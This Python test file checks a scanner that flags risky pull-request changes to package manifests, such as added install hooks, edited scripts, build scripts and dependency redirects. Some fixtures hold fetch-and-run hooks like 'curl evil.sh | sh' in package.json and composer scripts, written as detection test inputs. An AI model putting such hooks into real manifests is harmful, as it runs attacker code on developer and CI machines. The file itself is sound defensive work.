"""Tests for the deterministic manifest scripts-key scan."""

import subprocess

import pytest

from manifest_risk import manifest_change_is_risky


def _pkg(scripts: str = "", extra: str = "") -> str:
    scripts_part = f', "scripts": {{{scripts}}}' if scripts else ""
    return f'{{"name": "x", "version": "1.0.0"{scripts_part}{extra}}}'


@pytest.mark.parametrize(
    "path, base, head, risky",
    [
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest", "postinstall": "node evil.js"'),
            True,
            id="lifecycle-hook-added-inside-scripts",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest && curl evil.sh | sh"'),
            True,
            id="existing-script-command-edited",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg('"test": "jest"'),
            _pkg('"test": "jest"').replace('"1.0.0"', '"1.0.1"'),
            False,
            id="version-bump-clean",
        ),
        pytest.param(
            "frontend/package.json",
            _pkg(),
            _pkg(extra=', "pnpm": {"onlyBuiltDependencies": ["evil"]}'),
            True,
            id="pnpm-config-added",
        ),
        pytest.param(
            "pyproject.toml",
            "[project]\nname = 'x'\n",
            "[project]\nname = 'x'\n[project.scripts]\nx = 'pkg:main'\n",
            True,
            id="pyproject-scripts-added",
        ),
        pytest.param(
            "pyproject.toml",
            "[tool.poetry.scripts]\nx = 'a:main'\n",
            "[tool.poetry.scripts]\nx = 'b:main'\n",
            True,
            id="nested-tool-scripts-value-edited",
        ),
        pytest.param(
            "pyproject.toml",
            "[tool.ruff]\nline-length = 100\n",
            "[tool.ruff]\nline-length = 120\n",
            False,
            id="pyproject-tool-config-clean",
        ),
        pytest.param(
            "common/esbuilder/tsconfig.json",
            '{"compilerOptions": {"strict": true}}',
            '{"compilerOptions": {"strict": true}, "extends": "evil/tsconfig"}',
            True,
            id="tsconfig-extends-added",
        ),
        pytest.param(
            "common/esbuilder/tsconfig.json",
            '{"compilerOptions": {"strict": false}}',
            '{"compilerOptions": {"strict": true}}',
            False,
            id="tsconfig-option-clean",
        ),
        pytest.param("setup.py", "VERSION = '1.0'", "VERSION = '1.1'", True, id="setup-py-any-change"),
        pytest.param(
            "composer.json",
            '{"name": "x/x", "require": {"php": "^8.0"}}',
            '{"name": "x/x", "require": {"php": "^8.0"}, "scripts": {"post-install-cmd": "curl evil | sh"}}',
            True,
            id="composer-scripts-added",
        ),
        pytest.param(
            "composer.json",
            '{"name": "x/x", "version": "1.0.0"}',
            '{"name": "x/x", "version": "1.0.1"}',
            False,
            id="composer-version-bump-clean",
        ),
        pytest.param(
            "rust/Cargo.toml",
            '[dependencies]\nserde = "1.0"\n',
            '[dependencies]\nserde = "1.0.99"\n',
            True,
            id="cargo-dep-version-bump-fetches-in-unlocked-ci",
        ),
        pytest.param(
            "rust/Cargo.toml",
            "[features]\ndefault = []\n",
            '[features]\ndefault = ["optional-dep"]\n',
            True,
            id="cargo-feature-toggles-optional-dep",
        ),
        pytest.param(
            "rust/Cargo.toml",
            '[package]\nname = "x"\nversion = "1.0.0"\n',
            '[package]\nname = "x"\nversion = "1.0.1"\n',
            False,
            id="cargo-own-version-bump-clean",
        ),
        pytest.param(
            "rust/Cargo.toml",
            '[package]\nname = "x"\n',
            '[package]\nname = "x"\nbuild = "build.rs"\n',
            True,
            id="cargo-build-script-added",
        ),
        pytest.param("posthog/api/insight.py", "a", "b", False, id="non-manifest-never-risky"),
    ],
)
def test_manifest_change_is_risky_structural(path: str, base: str, head: str, risky: bool) -> None:
    # Both reviewer bots demonstrated the line-scan bypass: editing an
    # existing script's command diffs as a line keyed by the script's own
    # name, so only a structural compare of the risky subtrees catches it.
    # Over-matching matters too - version bumps hard-denying would undo the
    # manifest calibration entirely.
    assert manifest_change_is_risky(path, base, head, diff_text="") is risky


@pytest.mark.parametrize(
    "path, base, head",
    [
        pytest.param("frontend/package.json", _pkg(), "{not json", id="package-json"),
        pytest.param("pyproject.toml", "[project]\nname = 'x'\n", "[project\nname = 'x'\n", id="pyproject-toml"),
        pytest.param("Pipfile", "[packages]\n", "[packages\n", id="pipfile"),
        pytest.param("rust/Cargo.toml", '[package]\nname = "x"\n', '[package\nname = "x"\n', id="cargo-toml"),
        pytest.param("composer.json", '{"name": "x/x"}', "{not json", id="composer-json"),
    ],
)
def test_manifest_change_is_risky_unparseable_fails_closed(path: str, base: str, head: str) -> None:
    # Each _STRUCTURAL_RISK_CHECKS entry has its own parse-failure exception
    # tuple; narrowing any one of them would fail open for that manifest
    # alone, so every format needs its own fail-closed case, not just json.
    assert manifest_change_is_risky(path, base, head, diff_text="") is True


@pytest.mark.parametrize(
    "path, diff_line, risky",
    [
        pytest.param("go.mod", "+replace example.com/x => ../local", True, id="go-mod-replace"),
        pytest.param("go.mod", "+require example.com/x v1.2.3", False, id="go-mod-require-clean"),
    ],
)
def test_line_scan_families(path: str, diff_line: str, risky: bool) -> None:
    # go.mod keeps the line scan: key and value share a line, and a require
    # bump without go.sum fails CI deterministically (-mod=readonly), so only
    # replace directives are silent-fetch risks.
    diff = f"--- a/{path}\n+++ b/{path}\n@@ -1,3 +1,3 @@\n context\n{diff_line}\n"
    assert manifest_change_is_risky(path, "irrelevant", "irrelevant2", diff) is risky


def test_tsconfig_jsonc_falls_back_to_line_scan() -> None:
    # tsconfig is often JSONC; failing closed on comments would hard-deny
    # every commented tsconfig edit and undo the calibration.
    jsonc = '{\n  // comment\n  "compilerOptions": {"strict": true},\n}'
    clean_diff = '--- a/tsconfig.json\n+++ b/tsconfig.json\n@@\n+  "strict": true,\n'
    risky_diff = '--- a/tsconfig.json\n+++ b/tsconfig.json\n@@\n+  "extends": "evil",\n'
    assert manifest_change_is_risky("tsconfig.json", jsonc, jsonc + " ", clean_diff) is False
    assert manifest_change_is_risky("tsconfig.json", jsonc, jsonc + " ", risky_diff) is True


def test_wrapper_anchors_at_merge_base_not_base_tip(tmp_path) -> None:
    # Regression from review: comparing against the base branch *tip* counts
    # base-side drift (someone else's scripts change landing on the base) as
    # this PR's doing and falsely denies a clean manifest edit.
    from manifest_risk import manifest_script_changes

    def run(*args: str) -> str:
        result = subprocess.run(["git", *args], capture_output=True, text=True, cwd=tmp_path, check=True)
        return result.stdout.strip()

    run("init", "-q", "-b", "main")
    run("config", "user.email", "t@t")
    run("config", "user.name", "t")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
    run("add", ".")
    run("commit", "-qm", "root")

    run("checkout", "-qb", "feature")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.1"}')
    run("commit", "-qam", "version bump only")
    head = run("rev-parse", "HEAD")

    run("checkout", "-q", "main")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0", "scripts": {"evil": "x"}}')
    run("commit", "-qam", "base-side scripts change")
    base_tip = run("rev-parse", "HEAD")

    assert manifest_script_changes(["package.json"], base_tip, head, tmp_path) == []
